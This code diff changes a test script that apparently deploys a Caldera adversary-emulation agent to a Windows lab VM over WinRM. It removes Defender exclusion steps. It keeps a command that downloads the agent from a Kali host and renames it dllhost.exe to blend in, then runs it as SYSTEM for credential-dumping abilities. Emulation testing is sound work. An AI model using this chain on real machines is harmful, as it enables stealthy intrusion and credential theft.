@@ -159,28 +159,6 @@ async function testSandcatDeploy() {
       if (agents.length) console.log(`  Cleaned ${agents.length} stale agents`)
     } catch {}
 
-    // Check if localuser is admin
-    const whoami = await winrmRun(WIN11_IP, "localuser", "password", 'powershell -Command "if (whoami /groups | Select-String S-1-5-32-544) { Write-Host ADMIN } else { Write-Host NOT_ADMIN }"')
-    console.log(`  admin: ${whoami.trim()}`)
-    const isAdmin = whoami.includes("ADMIN") && !whoami.includes("NOT_ADMIN")
-
-    // Only add exclusion if Defender real-time protection is enabled
-    if (isAdmin) {
-      try {
-        const status = await winrmRun(WIN11_IP, "localuser", "password",
-          'powershell -Command "if ((Get-MpComputerStatus).RealTimeProtectionEnabled) { Write-Host ENABLED } else { Write-Host DISABLED }"')
-        if (status.trim() === "ENABLED") {
-          await winrmRun(WIN11_IP, "localuser", "password",
-            'powershell -Command "Add-MpPreference -ExclusionPath \'C:\\Users\\Public\'"')
-          console.log("  Defender: exclusion added for C:\\Users\\Public")
-        } else {
-          console.log("  Defender: real-time protection is DISABLED")
-        }
-      } catch {
-        console.log("  Defender: exclusion failed")
-      }
-    }
-
     // ── Step 1: Network check ──
     console.log("\n  [1] Network to Caldera")
     const netTest = await winrmRun(WIN11_IP, "localuser", "password",
@@ -358,15 +336,6 @@ async function testFullPipeline() {
 
     // ── Step 3: Deploy sandcat via Scheduled Task as SYSTEM ──
     console.log(`\n  [3/6] Deploying sandcat as SYSTEM (group=${group})...`)
-    try {
-      const status = await winrmRun(WIN11_IP, "localuser", "password",
-        'powershell -Command "if ((Get-MpComputerStatus).RealTimeProtectionEnabled) { Write-Host ENABLED } else { Write-Host DISABLED }"')
-      if (status.trim() === "ENABLED") {
-        await winrmRun(WIN11_IP, "localuser", "password",
-          'powershell -Command "Add-MpPreference -ExclusionPath \'C:\\Users\\Public\'"')
-        console.log("    Defender: exclusion added")
-      }
-    } catch {}
     const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
       `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
     console.log(`    => download: ${dlResult.trim()}`)
@@ -443,14 +412,17 @@ async function testFullPipeline() {
       const links = ag?.links || []
       const mine = links.find(l => l.ability?.ability_id === abilityId)
       if (mine) {
-        console.log(`    Link found: id=${mine.id} status=${mine.status}`)
-        console.log(`    Command: ${mine.command}`)
-        console.log(`    Output (stdout): ${mine.output?.stdout || "(none)"}`)
-        console.log(`    Output (stderr): ${mine.output?.stderr || "(none)"}`)
-        console.log(`    Facts: ${JSON.stringify(mine.facts)}`)
-        linkStatus = mine.status
-        linkFacts = mine.facts || []
-        break
+        console.log(`    Link found: id=${mine.id} status=${mine.status} finish=${mine.finish}`)
+        if (mine.finish != null) {
+          console.log(`    Command: ${mine.command}`)
+          console.log(`    Output (stdout): ${mine.output?.stdout || "(none)"}`)
+          console.log(`    Output (stderr): ${mine.output?.stderr || "(none)"}`)
+          console.log(`    Facts: ${JSON.stringify(mine.facts)}`)
+          linkStatus = mine.status
+          linkFacts = mine.facts || []
+          break
+        }
+        console.log(`    Link pending (status=${mine.status}), waiting...`)
       }
       await new Promise(r => setTimeout(r, 2000))
     }
@@ -570,22 +542,19 @@ async function testFullPipeline() {
 // ─── Sandcat Deployment Path (from testAbility.js) ───────────────────────────
 //
 // For Windows (via WinRM → Scheduled Task):
-//   1. Check (Get-MpComputerStatus).RealTimeProtectionEnabled — only add exclusion if enabled
-//   2. If enabled → Add-MpPreference -ExclusionPath "C:\Users\Public"
-//   3. Download sandcat binary via WebClient
-//   4. Create Scheduled Task as NT AUTHORITY\SYSTEM:
+//   1. Download sandcat binary via WebClient
+//   2. Create Scheduled Task as NT AUTHORITY\SYSTEM:
 //        $action = New-ScheduledTaskAction -Execute 'C:\Users\Public\dllhost.exe' -Argument '-server ... -group ...'
 //        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
 //        $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest
 //        Register-ScheduledTask ... -Force | Out-Null
 //        Start-ScheduledTask ...
-//   5. Cleanup: Unregister-ScheduledTask at end of pipeline
+//   3. Cleanup: Unregister-ScheduledTask at end of pipeline
 //
 // FIXED: Sandcat runs as SYSTEM via Scheduled Task (not Start-Process -WindowStyle Hidden)
 //        which detaches from WinRM session and provides correct privilege level for
 //        credential-dumping abilities (LSASS access, SAM hive, etc.)
 // FIXED: Binary renamed dllhost.exe (blends in as Windows COM Surrogate name).
-// FIXED: Defender real-time protection block bypassed with Add-MpPreference -ExclusionPath.
 // FIXED: Task cleanup via Unregister-ScheduledTask at end of pipeline.
 
 // ─── Main ────────────────────────────────────────────────────────────────────
